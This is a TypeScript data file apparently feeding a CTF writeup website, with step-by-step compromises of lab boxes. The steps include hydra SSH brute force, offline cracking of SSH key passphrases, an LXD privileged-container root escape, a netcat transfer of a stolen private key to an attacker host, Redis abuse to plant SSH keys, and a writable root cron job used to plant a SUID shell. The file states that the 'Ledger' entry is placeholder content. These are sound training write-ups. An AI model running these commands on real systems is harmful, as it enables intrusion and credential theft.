// "gaming-server" and "basic-pentesting" are real, condensed writeups.
// Everything else in this file is still placeholder content used to
// design the layout, pending conversion from raw notes.

export type MachinePhase = {
  title: string;
  body: string;
};

export type Machine = {
  slug: string;
  name: string;
  platform: "HackTheBox" | "TryHackMe";
  difficulty: "Easy" | "Medium" | "Hard";
  os: "Linux" | "Windows";
  date: string;
  tags: string[];
  summary: string;
  phases: MachinePhase[];
};

export const machines: Machine[] = [
  {
    slug: "gaming-server",
    name: "Gaming Server",
    platform: "TryHackMe",
    difficulty: "Medium",
    os: "Linux",
    date: "2026-01-30",
    tags: [
      "nmap",
      "gobuster",
      "source-disclosure",
      "ssh-key-crack",
      "john",
      "lxd-privesc",
    ],
    summary:
      "A TryHackMe Linux box where a leaked upload-handler source and a passphrase-protected SSH key lead to a foothold, and lxd group membership finishes the job.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap 10.48.153.3
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
\`\`\`

\`\`\`shell
$ nmap -p 22,80 -sV -T4 10.48.153.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
\`\`\`

\`\`\`shell
$ gobuster dir -u http://10.48.153.3 -w DirBuster-2007_directory-list-lowercase-2.3-small.txt -x php,html,txt
index.html    (Status: 200)
about.html    (Status: 200)
about.php     (Status: 200)
uploads       (Status: 301)
robots.txt    (Status: 200)
secret        (Status: 301)
myths.html    (Status: 200)
\`\`\`

\`robots.txt\` doesn't hide anything &mdash; it points straight at
\`/uploads/\`:

\`\`\`text
user-agent: *
Allow: /
/uploads/
\`\`\`
`,
      },
      {
        title: "Enumeration",
        body: `The site itself is a fantasy-game landing page with nothing useful in
the nav &mdash; everything interesting is off the beaten path.

![Home page of the target site, a fantasy game landing page called Draagan](/writeups/gaming-server/enum-target-homepage.png)

\`robots.txt\` doesn't hide anything &mdash; it points straight at
\`/uploads/\`:

\`\`\`text
user-agent: *
Allow: /
/uploads/
\`\`\`

![robots.txt served in the browser, listing /uploads/](/writeups/gaming-server/enum-robots-txt.png)

Both \`/uploads/\` and \`/secret/\` have directory listing enabled.

![Directory listing for /uploads/ showing dict.lst, manifesto.txt, and meme.jpg](/writeups/gaming-server/enum-uploads-listing.png)

\`/uploads/\` has \`dict.lst\` (a candidate password list), \`manifesto.txt\`
(nothing useful), and \`meme.jpg\`. The image turned out to be a
\`steghide\`-protected red herring &mdash; \`stegseek\` against it with
\`dict.lst\` came up empty:

![stegseek --crack against meme.jpg failing to find a valid passphrase](/writeups/gaming-server/enum-stegseek-fail.png)

![Directory listing for /secret/ showing a single file, secretKey](/writeups/gaming-server/enum-secret-listing.png)

\`/secret/\` has a single file, \`secretKey\`, which turns out to be a
passphrase-protected RSA private key:

\`\`\`shell
$ wget http://10.48.153.3/secret/secretKey
$ cat secretKey
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
...
-----END RSA PRIVATE KEY-----
\`\`\`

Viewing the homepage source turns up a username in an HTML comment:

![HTML source comment addressed to john about placeholder content](/writeups/gaming-server/enum-html-comment-username.png)

\`\`\`html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
\`\`\`

\`about.php\` renders the same page as \`about.html\` but adds a file
upload form:

![about.php page rendered in the browser with a file upload form](/writeups/gaming-server/enum-about-php-upload-form.png)

Intercepting a request to it in Burp caught one response that leaked
the handler's raw PHP source instead of executing it:

![Burp Suite response tab showing the leaked PHP source of the upload handler](/writeups/gaming-server/enum-burp-leaked-source.png)

\`\`\`php
<?php
  if(isset($_FILES['image'])){
    $errors = array();
    $file_name = $_FILES['image']['name'];
    ...
    $file_ext = strtolower(end(explode('.',$FILES['image']['name'])));

    $expensions = array('jpeg', 'jpg', 'png', 'php');

    if(in_array($file_ext,$expensions)=== false){
      $errors[] = "extension not allowed, please choose a different file type.";
    }

    if(empty($errors) == true){
      move_uploaded_file($file_tmp,"uploads/".$filename);
      echo "Success";
    }else{
      print_r($errors);
    }
  }
?>
\`\`\`

Two bugs in six lines: the extension check reads \`$FILES\` instead of
\`$_FILES\` (so \`$file_ext\` is always empty), and the move step writes
\`$filename\` &mdash; a variable that's never defined &mdash; instead of
\`$file_name\`. \`.php\` is technically in the whitelist, but the upload
can never actually land. Confirmed by trying: a PHP reverse shell
uploads with no error, and never shows up under \`/uploads/\`.`,
      },
      {
        title: "Foothold",
        body: `A first attempt at \`john\` over SSH just asks for a password that
neither wordlist nor the raw key can satisfy:

![SSH prompting for john's password with the host key not yet trusted](/writeups/gaming-server/foothold-ssh-password-prompt.png)

With the upload path dead, \`john\` plus the leaked \`dict.lst\` is the
way in &mdash; but not against SSH directly:

\`\`\`shell
$ hydra -l john -P dict.lst 10.48.153.3 ssh -t 4
1 of 1 target completed, 0 valid password found
\`\`\`

Trying \`secretKey\` as the identity file just moves the same problem to
its passphrase:

![SSH repeatedly rejecting the passphrase for secretKey](/writeups/gaming-server/foothold-ssh-key-passphrase-fail.png)

The private key's passphrase is a better target for the same wordlist,
cracked offline instead of over the wire:

\`\`\`shell
$ ssh2john secretKey > keysecret.txt
$ john -w dict.lst keysecret.txt --format=ssh
letmein          (secretKey)
\`\`\`

![john cracking secretKey's passphrase as "letmein"](/writeups/gaming-server/foothold-john-crack-passphrase.png)

\`\`\`shell
$ chmod 600 secretKey
$ ssh -i secretKey john@10.48.153.3
Enter passphrase for key 'secretKey': letmein
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
\`\`\`

![Logged in over SSH as john, dropped to a shell prompt](/writeups/gaming-server/foothold-ssh-login-success.png)

![whoami confirming the shell belongs to john](/writeups/gaming-server/foothold-whoami-john.png)`,
      },
      {
        title: "Privilege escalation",
        body: `\`john\` is in the \`sudo\` group, but only \`sudo\` with the account's
actual login password works &mdash; which isn't known, only the SSH key
is:

\`\`\`shell
$ sudo -l
[sudo] password for john:
Sorry, try again.
\`\`\`

![sudo -l and sudo -i both rejecting john's unknown password](/writeups/gaming-server/privesc-sudo-fail.png)

The more interesting group from \`id\` is \`lxd\`:

![id showing john's group membership, including lxd](/writeups/gaming-server/privesc-id-lxd-group.png)

\`linpeas\` flags it directly, and it's a well-known container-escape
path documented on GTFOBins:

![linpeas highlighting john's sudo and lxd group membership](/writeups/gaming-server/privesc-linpeas-lxd.png)

![GTFOBins' lxd entry showing the image-build-and-mount escape](/writeups/gaming-server/privesc-gtfobins-lxd.png)

Since no base image is present on the box yet, build one locally with
[lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) and
serve it over HTTP:

\`\`\`shell
$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ sudo ./build-alpine -a i686
$ python3 -m http.server 8000
\`\`\`

![Cloning lxd-alpine-builder on the attacker box](/writeups/gaming-server/privesc-alpine-builder-clone.png)

![The built Alpine image tarball ready to serve](/writeups/gaming-server/privesc-alpine-image-built.png)

Pull it onto the target:

![wget pulling the Alpine image tarball onto the target](/writeups/gaming-server/privesc-image-transferred.png)

...import it, and launch a privileged container with the host
filesystem mounted in:

\`\`\`shell
$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
$ lxc init myimage ignite -c security.privileged=true
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start ignite
$ lxc exec ignite /bin/sh
$ id
uid=0(root) gid=0(root)
\`\`\`

![Root shell inside the privileged LXD container](/writeups/gaming-server/privesc-root-shell.png)

The container's own \`/root\` is just the fresh Alpine image's empty
home directory &mdash; **the real host filesystem is mounted at**
\`/mnt/root\` because of the device added above, so that's where the
loot actually lives:

![Navigating from the container's /root to the mounted host filesystem under /mnt](/writeups/gaming-server/privesc-searching-for-flag.png)

![root.txt located under /mnt/root, the mounted host filesystem](/writeups/gaming-server/privesc-root-flag-location.png)
`,
      },
    ],
  },
  {
    slug: "basic-pentesting",
    name: "Basic Pentesting",
    platform: "TryHackMe",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-07-03",
    tags: [
      "nmap",
      "smb",
      "ffuf",
      "hydra",
      "ssh-key-crack",
      "john",
      "lateral-movement",
    ],
    summary:
      "A TryHackMe Linux box where an HTTP dev-notes leak and anonymous SMB access surface two usernames, a brute-forced SSH password gets a foothold as one of them, and a world-readable SSH key leads to lateral movement into the other.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap -p- -T4 -sV -sC -oN nmap 10.49.191.54
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
\`\`\`

Two SMB ports alongside SSH and a stock Apache/Tomcat pair &mdash; SMB is
most likely an attack vector.`,
      },
      {
        title: "Enumeration",
        body: `The port 80 site is just a placeholder, but its HTML source hints at
where the real content lives:

![Homepage showing an "Undergoing maintenance" placeholder message](/writeups/basic-pentesting/enum-http-homepage.png)

\`\`\`html
<!-- Check our dev note section if you need to know what to work on. -->
\`\`\`

![Page source revealing the HTML comment about a dev note section](/writeups/basic-pentesting/enum-http-view-source.png)

Fuzzing for that "dev note section" turns up \`/development\`:

\`\`\`shell
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.49.191.54/FUZZ -e .html
development             [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 30ms]
\`\`\`

![Directory listing for /development showing dev.txt and j.txt](/writeups/basic-pentesting/enum-development-listing.png)

Both files are internal dev notes, and name two users right away:

\`\`\`text
For J:

I've been auditing the contents of /etc/shadow to make sure we don't
have any weak credentials, and I was able to crack your hash really
easily. You know our password policy, so please follow it? Change
that password ASAP.

-K
\`\`\`

![j.txt: K warning J about a weak, easily-cracked password](/writeups/basic-pentesting/enum-development-jtxt.png)

\`\`\`text
2018-04-23: I've been messing with that struts stuff, and it's pretty
cool! ... using version 2.5.12, because other versions were giving me
trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
\`\`\`

![dev.txt: K and J's dev log, confirming SMB is configured](/writeups/basic-pentesting/enum-development-devtxt.png)

With SMB confirmed live, anonymous access is the next thing to check:

\`\`\`shell
$ smbclient -N -L //10.49.184.181
Sharename       Type      Comment
Anonymous       Disk
IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)

$ smbclient -U kay //10.49.184.181/Anonymous
Password for [WORKGROUP\\kay]:
smb: \\> ls
staff.txt
smb: \\> get staff.txt
\`\`\`

![smbclient listing the Anonymous share and pulling staff.txt](/writeups/basic-pentesting/enum-smb-anonymous-listing.png)

\`staff.txt\` names the second user and a target for a password guess:

\`\`\`text
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know
it's all in fun, but this is how mistakes happen. (This means you
too, Jan!)

-Kay
\`\`\`

![staff.txt: Kay calling out Jan for uploading non-work files](/writeups/basic-pentesting/enum-smb-stafftxt.png)

Between the dev notes (K, J) and the staff announcement (Kay, addressed
to Jan), two real usernames fall out: \`kay\` and \`jan\`.`,
      },
      {
        title: "Foothold",
        body: `With a valid username and no working password yet, \`hydra\` against SSH
is the next move:

\`\`\`shell
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.49.184.181 ssh
[22][ssh] host: 10.49.184.181   login: jan   password: armando
\`\`\`

![hydra finding jan's SSH password as "armando"](/writeups/basic-pentesting/foothold-hydra-ssh-crack.png)

\`\`\`shell
$ ssh jan@10.48.156.54
jan@10.48.156.54's password: armando
Welcome to Ubuntu 20.04.6 LTS
\`\`\`

![Logged in over SSH as jan](/writeups/basic-pentesting/foothold-ssh-login-jan.png)

jan's own home directory is empty aside from an unreadable \`.lesshst\`,
so the next stop is the other user found during enumeration:

\`\`\`shell
jan@ip-10-48-156-54:~$ cd ..
jan@ip-10-48-156-54:/home$ ls
jan  kay  ubuntu
jan@ip-10-48-156-54:/home$ cd kay
jan@ip-10-48-156-54:/home/kay$ ls -la
-rw------- 1 kay  kay    57 pass.bak
drwxr-xr-x 2 kay  kay  4096 .ssh
\`\`\`

![Poking around jan's home directory, then kay's](/writeups/basic-pentesting/foothold-jan-home-enum.png)

![Directory listing for kay's home, showing pass.bak and .ssh](/writeups/basic-pentesting/foothold-kay-home-listing.png)

\`pass.bak\` is unreadable as jan, but \`.ssh\` isn't, and its private key
is sitting there world-readable:

\`\`\`shell
jan@ip-10-48-156-54:/home/kay$ cd .ssh
jan@ip-10-48-156-54:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
...
\`\`\`

![Reading kay's world-readable id_rsa from jan's shell](/writeups/basic-pentesting/foothold-kay-ssh-key-leak.png)`,
      },
      {
        title: "Lateral movement",
        body: `The key is passphrase-protected, so it needs to come back to the
attacking box to crack offline. Netcat moves it over:

\`\`\`shell
# on the target, as jan
$ nc 192.168.151.91 1234 < id_rsa

# on the attacker box
$ nc -lvnp 1234 > id_rsa
$ chmod 600 id_rsa
\`\`\`

![Netcat pulling id_rsa across and chmod-ing it locally](/writeups/basic-pentesting/lateral-netcat-key-transfer.png)

\`\`\`shell
$ ssh kay@10.48.156.54 -i id_rsa
Enter passphrase for key 'id_rsa':
\`\`\`

![SSH prompting for id_rsa's passphrase, confirming it's protected](/writeups/basic-pentesting/lateral-ssh-key-passphrase-prompt.png)

Same offline-crack approach as the earlier SSH key &mdash; \`ssh2john\`
plus \`john\` against \`rockyou.txt\`:

\`\`\`shell
$ ssh2john id_rsa > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
beeswax          (id_rsa)
\`\`\`

![john cracking id_rsa's passphrase as "beeswax"](/writeups/basic-pentesting/lateral-john-crack-passphrase.png)

\`\`\`shell
$ ssh kay@10.48.143.202 -i id_rsa
Enter passphrase for key 'id_rsa': beeswax
kay@ip-10-48-143-202:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
\`\`\`

![Logged in over SSH as kay using the cracked key](/writeups/basic-pentesting/lateral-ssh-login-kay.png)

![cat pass.bak revealing the box's final password](/writeups/basic-pentesting/lateral-final-password.png)

\`pass.bak\` in kay's home directory holds the box's final password
&mdash; the thing K's dev-note comment about auditing \`/etc/shadow\` and
Jan's own leaked password were ultimately pointing at.`,
      },
    ],
  },
  {
    slug: "ledger",
    name: "Ledger",
    platform: "HackTheBox",
    difficulty: "Easy",
    os: "Linux",
    date: "2026-03-02",
    tags: ["redis", "ssh-keys", "cron"],
    summary:
      "An easy Linux box with an unauthenticated Redis instance that's abused to plant an SSH key, then a root cron job that finishes the job. Placeholder writeup used to design this section's layout.",
    phases: [
      {
        title: "Recon",
        body: `\`\`\`shell
$ nmap -p- -T4 10.10.71.9
PORT     STATE SERVICE
22/tcp   open  ssh
6379/tcp open  redis
\`\`\`

Redis with no auth configured:

\`\`\`shell
$ redis-cli -h 10.10.71.9 ping
PONG
$ redis-cli -h 10.10.71.9 config get requirepass
1) "requirepass"
2) ""
\`\`\`

An open, unauthenticated Redis instance is enough on its own &mdash; the
next step is turning read/write access into code execution.`,
      },
      {
        title: "Foothold",
        body: `Redis can write arbitrary files, so the standard move is to write an
SSH public key into a user's \`authorized_keys\`:

\`\`\`shell
$ (echo -e "\\n\\n"; cat id_rsa.pub; echo -e "\\n\\n") > key.txt
$ redis-cli -h 10.10.71.9 flushall
$ cat key.txt | redis-cli -h 10.10.71.9 -x set ssh_key
$ redis-cli -h 10.10.71.9 config set dir /home/ledger/.ssh
$ redis-cli -h 10.10.71.9 config set dbfilename authorized_keys
$ redis-cli -h 10.10.71.9 save
\`\`\`

\`\`\`shell
$ ssh -i id_rsa ledger@10.10.71.9
ledger@ledger:~$ id
uid=1000(ledger) gid=1000(ledger) groups=1000(ledger)
\`\`\`

Grab the user flag from \`/home/ledger/user.txt\`.`,
      },
      {
        title: "Privilege escalation",
        body: `\`/etc/crontab\` is world-readable and shows a root cron job running a
script the \`ledger\` user can write to:

\`\`\`shell
$ cat /etc/crontab
* * * * * root /opt/ledger/sync.sh
$ ls -la /opt/ledger/sync.sh
-rwxrwxr-x 1 root ledger /opt/ledger/sync.sh
\`\`\`

Append a reverse shell (or SUID bash copy) to the script and wait for the
next minute's run:

\`\`\`shell
$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/ledger/sync.sh
$ sleep 60 && /tmp/rootbash -p
rootbash-5.1# whoami
root
\`\`\`
`,
      },
      {
        title: "Loot",
        body: `**User flag:** \`HTB{placeholder_user_flag_ledger}\`

**Root flag:** \`HTB{placeholder_root_flag_ledger}\`
`,
      },
    ],
  },
];

export function getMachine(slug: string): Machine | undefined {
  return machines.find((m) => m.slug === slug);
}

export function machinesByPlatform(platform: Machine["platform"]): Machine[] {
  return machines.filter((m) => m.platform === platform);
}

// URL segment for each platform, e.g. /writeups/tryhackme, /writeups/hackthebox
export const PLATFORM_ROUTES = {
  TryHackMe: "tryhackme",
  HackTheBox: "hackthebox",
} as const;

export function platformSlug(platform: Machine["platform"]): string {
  return PLATFORM_ROUTES[platform];
}
